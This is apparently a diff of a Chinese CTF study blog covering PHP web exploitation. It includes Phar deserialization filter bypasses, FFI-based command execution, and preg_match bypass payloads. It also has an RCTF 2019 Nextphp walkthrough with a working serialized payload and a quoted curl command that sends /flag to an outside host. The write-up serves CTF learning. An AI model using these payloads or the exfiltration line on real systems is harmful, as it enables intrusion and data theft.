+<p>我修改了名字之后无法上传成功</p>
+<p>最开始我以为编码的问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429171606.png" alt="20240429171606"></p>
+<p>依旧失败,但是我发现只要使用登录时，创建过文件的phpsession,就可以创建成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429171725.png" alt="20240429171725"></p>
+<p>查看文件<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429172019.png" alt="20240429172019"></p>
+<p>接下来直接上蚁剑，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429172157.png" alt="20240429172157"></p>
+<p>辅助工具绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429172450.png" alt="20240429172450"></p>
+<p>backtrace_uaf绕过成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429172528.png" alt="20240429172528"></p>
+<p>拿到flag</p>
+<h4 id="Thinkphp6-0-12LTS反序列化漏洞"><a href="#Thinkphp6-0-12LTS反序列化漏洞" class="headerlink" title="Thinkphp6.0.12LTS反序列化漏洞"></a>Thinkphp6.0.12LTS反序列化漏洞</h4><ul>
 <li>Thinkphp6.0.12LTS</li>
 <li>PHP7.4.3</li>
 </ul>
@@ -301,6 +404,60 @@
 <li>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤。</li>
 </ol>
 </blockquote>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="更改文件格式"><a href="#更改文件格式" class="headerlink" title="更改文件格式"></a>更改文件格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test &#123;</span><br><span class="line">        public $name;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            echo &quot;I am&quot;.$this-&gt;name.&quot;.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $obj = new Test();</span><br><span class="line">    $obj -&gt; name = &quot;quan9i&quot;;</span><br><span class="line">    $phar = new Phar(&#x27;test.phar&#x27;);</span><br><span class="line">    $phar -&gt; startBuffering(); //开始缓冲 Phar 写操作</span><br><span class="line">    $phar -&gt; setStub(&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;); //设置stub，添加gif文件头</span><br><span class="line">    $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); //要压缩的文件</span><br><span class="line">    $phar -&gt; setMetadata($obj);  //将自定义meta-data存入manifest</span><br><span class="line">    $phar -&gt; stopBuffering(); ////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>$phar -&gt; setStub(&#39;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#39;); //设置stub，添加gif文件头</code>图片绕过</p>
+<h5 id="绕过Phar关键字检测"><a href="#绕过Phar关键字检测" class="headerlink" title="绕过Phar关键字检测"></a>绕过Phar关键字检测</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、php://filter/read=convert.base64-encode/resource=phar://test.phar</span><br><span class="line">//即使用filter伪协议来进行绕过</span><br><span class="line">2、compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">//使用bzip2协议来进行绕过</span><br><span class="line">3、compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">//使用zlib协议进行绕过</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过-HALT-COMPILER检测"><a href="#绕过-HALT-COMPILER检测" class="headerlink" title="绕过__HALT_COMPILER检测"></a>绕过__HALT_COMPILER检测</h5><ol>
+<li>Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = serialize($a);</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(&#x27;phar.zip&#x27;,ZipArchive::CREATE); </span><br><span class="line">$zip-&gt;addFromString(&#x27;flag.txt&#x27;, &#x27;flag is here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($a);</span><br><span class="line">$zip-&gt;close();    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>将生成的Phar文件进行gzip压缩，压缩命令如下<br><code>gzip test.phar</code></li>
+</ol>
+<h3 id="php7-4的FFI扩展安全问题"><a href="#php7-4的FFI扩展安全问题" class="headerlink" title="php7.4的FFI扩展安全问题"></a>php7.4的FFI扩展安全问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">对于PHP，FFI提供了一种在纯PHP中编写PHP扩展和对C库的绑定的方法。</span><br><span class="line">然后，我们需要告诉PHP FFI我们要调用的函数原型是咋样的，这个我们可以使用FFI :: cdef，它的原型是：</span><br><span class="line">FFI :: cdef （[ string $ cdef  =  “”  [， string $ lib  = null ]]）： FFI</span><br><span class="line">在字符串$ cdef中，我们可以写C语言函数式申明，FFI会parse它，了解到我们要在字符串$ lib这个库中调用的函数的签名是怎样的</span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(&quot;</span><br><span class="line">    int add(int a, int b);</span><br><span class="line">&quot;, &quot;libc.so&quot;);</span><br><span class="line"></span><br><span class="line">$result = $ffi-&gt;add(2, 3);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FFI扩展，自php7.4推出的新扩展，它能够实现高级语言之间的互相调用。而在php里，它能够加载动态链接库，调用底层c语言的一些函数。与以往的传统调用C语言库的方式不同，它能够直接在php脚本中调用C语言库中的函数。所以说，FFI扩展是危险的，因为能直接调用底层c库中命令执行函数可以完全绕过php层面上的限制。接下来了解一下FFI扩展的具体应用，直接看一个例子：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);    </span><br><span class="line">$ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;);    </span><br><span class="line">echo file_get_contents(&quot;./ttmp&quot;);</span><br><span class="line">//输出结果为Hello World</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果在php配置文件中开启了ffi.enable=preload，那么FFI中opcache.preload参数指定脚本能够调用FFI，而用户写的函数是没有办法直接调用的。翻看phpinfo，也确实指定了preload.php能够调用FFI。</span><br></pre></td></tr></table></figure>
+
+<h4 id="php调用c语言FFI任意代码执行总结"><a href="#php调用c语言FFI任意代码执行总结" class="headerlink" title="php调用c语言FFI任意代码执行总结"></a>php调用c语言FFI任意代码执行总结</h4><p>在C语言中，可以使用system()函数来执行系统命令。这个函数定义在stdlib.h头文件中，它会调用默认的命令处理器来执行参数中的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);    </span><br><span class="line">$ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;);    </span><br><span class="line">echo file_get_contents(&quot;./ttmp&quot;);</span><br><span class="line">//输出结果为Hello World</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="buu练习-RCTF-2019-Nextphp-lt-PHP的预加载机制-preload-php7-4的FFI扩展安全问题-gt"><a href="#buu练习-RCTF-2019-Nextphp-lt-PHP的预加载机制-preload-php7-4的FFI扩展安全问题-gt" class="headerlink" title="buu练习([RCTF 2019]Nextphp) &lt;PHP的预加载机制(preload) php7.4的FFI扩展安全问题&gt;"></a>buu练习([RCTF 2019]Nextphp) &lt;PHP的预加载机制(preload) php7.4的FFI扩展安全问题&gt;</h4><ul>
+<li>PHP的预加载机制(preload)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP7.4版本，加入了预加载功能(preload)</span><br><span class="line"></span><br><span class="line">一般PHP代码执行过程如下：</span><br><span class="line"></span><br><span class="line">词法、语法分析-&gt;编译-&gt;加载编译代码-&gt;执行</span><br><span class="line"></span><br><span class="line">而函数预加载则是发生在加载编译代码时，预加载能够将框架，或者是类库预加载到内存中，以进一步提高性能</span><br><span class="line"></span><br><span class="line">因此在preload机制中，php文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用</span><br></pre></td></tr></table></figure>
+
+<p>这个题目直接给了一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上来直接给shell,<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240424112334.png" alt="20240424112334"></p>
+<p>被禁用,看phpinfo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240424112437.png" alt="20240424112437"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240424112454.png" alt="20240424112454"></p>
+<p>目录和函数都有很多被禁用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240424142917.png" alt="20240424142917"></p>
+<p>存在FFI</p>
+<p>接下来我们用一些没被禁用函数读取目录<code>var_dump(scandir(&#39;/var/www/html&#39;));</code></p>
+<p><code>array(2) &#123; [0]=&gt; string(9) &quot;index.php&quot; [1]=&gt; string(11) &quot;preload.php&quot; &#125;</code></p>
+<p>读到另外一个perload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>既然FFI是打开的那我们构建参数就构建c语言的命令执行,<br>反序列化执行，这里有一个知识点，就是<code>__serialize()</code>函数，如果我们生成序列化字符串的时候，不注释掉这个，就会序列化，就会先进入<code>__serialize()</code>，很明显，这个函数接受数组，返回数组，就会把data里面的参数理解为，数组，然后反序列化的<code>__unserialize</code>,有一个array_merge函数，会合并我们的数组就会覆盖掉我们构造的属性,从而无法命令执行，所以我们注释掉，执行<code>serialize ()</code>接收的是字符串，因为是字符串，所以不会受到<code>array_merge</code>影响就可以正常命令执行</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(char *command);&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new A;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>payload传参<br><code>?a=$a=unserialize(C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;)</code></p>
+<p>但是这个题目没有回显，所以需要外带flag，<br>大佬的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&#x27;C%3a1%3a&quot;A&quot;%3a97%3a&#123;a%3a3%3a&#123;s%3a3%3a&quot;ret&quot;%3bN%3bs%3a4%3a&quot;func&quot;%3bs%3a9%3a&quot;FFI%3a%3acdef&quot;%3bs%3a3%3a&quot;arg&quot;%3bs%3a34%3a&quot;int+php_exec(int+type,+char+*cmd)%3b&quot;%3b&#125;&#125;&#x27;);var_dump($a-&gt;ret-&gt;php_exec(2,&#x27;curl%20f1sh.site:2333/`cat%20/flag`&#x27;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="preg-match（）函数正则绕过总结"><a href="#preg-match（）函数正则绕过总结" class="headerlink" title="preg_match（）函数正则绕过总结"></a>preg_match（）函数正则绕过总结</h3><ol>
+<li><p>异或绕过<br>使用异或绕过：可以使用各种特殊字符的异或构造出字母和数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0, len(str)):</span><br><span class="line">    for j in range(0, len(str)):</span><br><span class="line">        a = ord(str[i])^ord(str[j])</span><br><span class="line">        print(str[i] + &#x27; ^ &#x27; + str[j] + &#x27; is &#x27; + chr(a))</span><br><span class="line"></span><br><span class="line">构造phpinfo()</span><br><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取反绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">urlencode(~&quot;getFlag&quot;)</span><br><span class="line">输出结果为：%98%9A%8B%B9%93%9E%98</span><br><span class="line">payload：?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取反拼接</p>
+</li>
+</ol>
 
                 
                 <p class="end">__END__</p>
